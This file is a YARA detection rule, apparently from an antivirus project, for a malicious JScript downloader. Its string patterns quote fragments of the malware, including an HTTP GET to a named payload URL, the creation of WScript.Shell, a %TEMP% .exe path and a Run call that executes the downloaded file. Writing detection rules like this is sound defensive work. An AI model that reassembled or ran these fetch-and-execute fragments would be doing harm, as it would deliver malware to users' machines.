rule sig_20160328_eca6e09d9eb2fb1d4dc25d6b1a88d138 {
  meta:
    description = "datamaliciousorder - file 20160328_eca6e09d9eb2fb1d4dc25d6b1a88d138.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "46cf1aedd4fbcc4edb504a43ff2be22b51dbb4538a962cc5873ea7be2dd11f5f"

  strings:
    $s1  = "function Zrzkdlb() {return Nbykksmkt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"u13A8fnqb.exe\";};" fullword ascii
    $s2  = "do {WScript[Nthtzcnvhr](Ximlixarko() * 11)} while (Zyzqrzfwjf[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Grzpzvy(Ugxzgb, Ozwwiwzw){return Ugxzgb - Ozwwiwzw;};" fullword ascii
    $s4  = "Zyzqrzfwjf[Spewwbh](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s5  = "var Nbykksmkt = function Cwjom() {return WScript[Nuifbtnol](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rzzplnskrx() {return ((Jyaavsv == true) && (Jyaavsv == Usujixkxsc)) ? 1 : Ayzcr;};" fullword ascii
    $s7  = "function Oznzajxii(Afdoktnqd){Nbykksmkt[\"Run\"](Afdoktnqd, Ayzcr, Ayzcr);};" fullword ascii
    $s8  = "return Grzpzvy(Xcfey, Levkrapn);" fullword ascii
    $s9  = "var Ccrixqrv = new this[\"Date\"]();" fullword ascii
    $s10 = "function Jybxdzojt(Pwdbc) {var Libzsyq = (1, 2, 3, 4, 5, Pwdbc); return Libzsyq;};" fullword ascii
    $s11 = "var Jyaavsv = false;" fullword ascii
    $s12 = "var Bilyatjb = false;" fullword ascii
    $s13 = "function Ximlixarko(){return 22;};" fullword ascii
    $s14 = "var Usujixkxsc = false;" fullword ascii
    $s15 = "function Bqjhgyott(){return Jptmx;};" fullword ascii
    $s16 = "Jyaavsv = true; " fullword ascii
    $s17 = "Usujixkxsc = true; " fullword ascii
    $s18 = "function Pkrbz()" fullword ascii
    $s19 = "function Gnpkkzb(){return Nuifbtnol;};" fullword ascii
    $s20 = " while (Jsxwdkf){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}